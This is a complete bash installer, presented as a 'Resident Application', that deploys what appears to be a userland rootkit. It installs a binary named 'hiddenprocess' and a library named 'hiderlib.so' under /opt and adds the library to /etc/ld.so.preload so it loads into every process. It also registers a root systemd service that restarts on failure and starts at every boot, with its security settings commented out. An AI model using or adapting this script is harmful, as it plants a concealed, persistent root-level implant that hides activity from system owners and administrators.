#!/bin/bash

# Installation script for Resident Application
# Must be run as root (sudo)

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}     Resident Application - Installer${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
echo ""

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Error: This installer must be run as root (use sudo)${NC}"
    exit 1
fi

# Configuration
SO_FILENAME="hiderlib.so"
EXEC_FILENAME="hiddenprocess"
INSTALL_PATH="/opt/hiddenprocess"
SERVICE_NAME="hiddenprocess"
LD_SO_PRELOAD="/etc/ld.so.preload"

# Get the directory where this script is located
SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"

# Check if we're being run from build directory (via Makefile)
# In that case, the binaries are in current directory
if [ -f "./hiderlib.so" ] && [ -f "./hiddenprocess" ]; then
    SCRIPT_DIR="."
    echo -e "${GREEN}✓ Running from build directory${NC}"
fi

echo -e "${GREEN}✓ Script directory: $SCRIPT_DIR${NC}"
echo ""

# Check if required files exist
echo -e "${BLUE}Checking required files...${NC}"
if [ ! -f "$SCRIPT_DIR/$SO_FILENAME" ]; then
    echo -e "${RED}✗ Error: $SO_FILENAME not found in $SCRIPT_DIR${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Found: $SO_FILENAME${NC}"

if [ ! -f "$SCRIPT_DIR/$EXEC_FILENAME" ]; then
    echo -e "${RED}✗ Error: $EXEC_FILENAME not found in $SCRIPT_DIR${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Found: $EXEC_FILENAME${NC}"
echo ""

# Create installation directory
echo -e "${BLUE}Creating installation directory...${NC}"
mkdir -p "$INSTALL_PATH"
if [ $? -ne 0 ]; then
    echo -e "${RED}✗ Failed to create directory: $INSTALL_PATH${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Created: $INSTALL_PATH${NC}"
echo ""

# Copy executable
echo -e "${BLUE}Installing executable...${NC}"
cp "$SCRIPT_DIR/$EXEC_FILENAME" "$INSTALL_PATH/$EXEC_FILENAME"
if [ $? -ne 0 ]; then
    echo -e "${RED}✗ Failed to copy executable${NC}"
    exit 1
fi
chmod +x "$INSTALL_PATH/$EXEC_FILENAME"
echo -e "${GREEN}✓ Installed: $INSTALL_PATH/$EXEC_FILENAME${NC}"
echo ""

# Copy shared library
echo -e "${BLUE}Installing shared library...${NC}"
cp "$SCRIPT_DIR/$SO_FILENAME" "$INSTALL_PATH/$SO_FILENAME"
if [ $? -ne 0 ]; then
    echo -e "${RED}✗ Failed to copy shared library${NC}"
    exit 1
fi
chmod 644 "$INSTALL_PATH/$SO_FILENAME"
echo -e "${GREEN}✓ Installed: $INSTALL_PATH/$SO_FILENAME${NC}"
echo ""

# Add to ld.so.preload
echo -e "${BLUE}Configuring ld.so.preload...${NC}"
SO_DEST="$INSTALL_PATH/$SO_FILENAME"

# Check if already in ld.so.preload
if [ -f "$LD_SO_PRELOAD" ]; then
    if grep -Fxq "$SO_DEST" "$LD_SO_PRELOAD"; then
        echo -e "${YELLOW}⚠ Path already exists in $LD_SO_PRELOAD${NC}"
    else
        echo "$SO_DEST" >> "$LD_SO_PRELOAD"
        echo -e "${GREEN}✓ Added $SO_DEST to $LD_SO_PRELOAD${NC}"
    fi
else
    echo "$SO_DEST" > "$LD_SO_PRELOAD"
    chmod 644 "$LD_SO_PRELOAD"
    echo -e "${GREEN}✓ Created $LD_SO_PRELOAD and added library${NC}"
fi
echo ""

# Create systemd service file
echo -e "${BLUE}Creating systemd service...${NC}"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

cat > "$SERVICE_FILE" << EOF
[Unit]
Description=Resident Application Service
After=network.target
Documentation=https://example.com

[Service]
Type=simple
User=root
Group=root
ExecStart=$INSTALL_PATH/$EXEC_FILENAME
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal

# Security settings
# PrivateTmp=true
# NoNewPrivileges=true

[Install]
WantedBy=multi-user.target
EOF

if [ $? -ne 0 ]; then
    echo -e "${RED}✗ Failed to create systemd service file${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Created service file: $SERVICE_FILE${NC}"
echo ""

# Reload systemd daemon
echo -e "${BLUE}Reloading systemd daemon...${NC}"
systemctl daemon-reload
if [ $? -ne 0 ]; then
    echo -e "${RED}✗ Failed to reload systemd daemon${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Systemd daemon reloaded${NC}"
echo ""

# Enable the service to start on boot
echo -e "${BLUE}Enabling service to start on boot...${NC}"
systemctl enable "$SERVICE_NAME.service"
if [ $? -ne 0 ]; then
    echo -e "${RED}✗ Failed to enable service${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Service enabled for automatic startup${NC}"
echo ""

# Start the service now
echo -e "${BLUE}Starting service now...${NC}"
systemctl start "$SERVICE_NAME.service"
if [ $? -ne 0 ]; then
    echo -e "${YELLOW}⚠ Failed to start service (check logs)${NC}"
else
    echo -e "${GREEN}✓ Service started successfully${NC}"
fi
echo ""

# Show service status
echo -e "${BLUE}Service status:${NC}"
systemctl status "$SERVICE_NAME.service" --no-pager -l
echo ""

# Summary
echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✓ Installation Complete!${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
echo ""
echo "Installation summary:"
echo -e "  ${GREEN}•${NC} Executable:        $INSTALL_PATH/$EXEC_FILENAME"
echo -e "  ${GREEN}•${NC} Shared library:    $INSTALL_PATH/$SO_FILENAME"
echo -e "  ${GREEN}•${NC} Preload config:    $LD_SO_PRELOAD"
echo -e "  ${GREEN}•${NC} Systemd service:   $SERVICE_FILE"
echo -e "  ${GREEN}•${NC} Running as:        root"
echo ""
echo "Service management commands:"
echo -e "  ${YELLOW}Start:${NC}    ${BLUE}sudo systemctl start $SERVICE_NAME${NC}"
echo -e "  ${YELLOW}Stop:${NC}     ${BLUE}sudo systemctl stop $SERVICE_NAME${NC}"
echo -e "  ${YELLOW}Restart:${NC}  ${BLUE}sudo systemctl restart $SERVICE_NAME${NC}"
echo -e "  ${YELLOW}Status:${NC}   ${BLUE}sudo systemctl status $SERVICE_NAME${NC}"
echo -e "  ${YELLOW}Logs:${NC}     ${BLUE}sudo journalctl -u $SERVICE_NAME -f${NC}"
echo -e "  ${YELLOW}Disable:${NC}  ${BLUE}sudo systemctl disable $SERVICE_NAME${NC}"
echo ""
echo "Log file location:"
echo -e "  ${BLUE}/root/process.txt${NC}"
echo ""
echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
